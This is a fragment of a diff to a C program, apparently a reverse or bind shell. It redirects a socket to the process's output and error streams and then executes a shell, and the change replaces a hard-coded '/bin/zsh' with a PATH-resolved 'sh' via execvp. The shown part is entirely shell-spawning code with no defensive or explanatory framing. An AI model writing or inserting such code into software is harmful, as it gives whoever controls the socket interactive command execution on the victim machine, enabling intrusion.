@@ -89,8 +89,8 @@ int main(void) {
     dup2(sockt, 1);
     dup2(sockt, 2);
 
-    char * const argv[] = {"/bin/zsh", NULL};
-    execve("/bin/zsh", argv, NULL);
+    char * const argv[] = {"sh", NULL};
+    execvp("sh", argv);
 
 
 
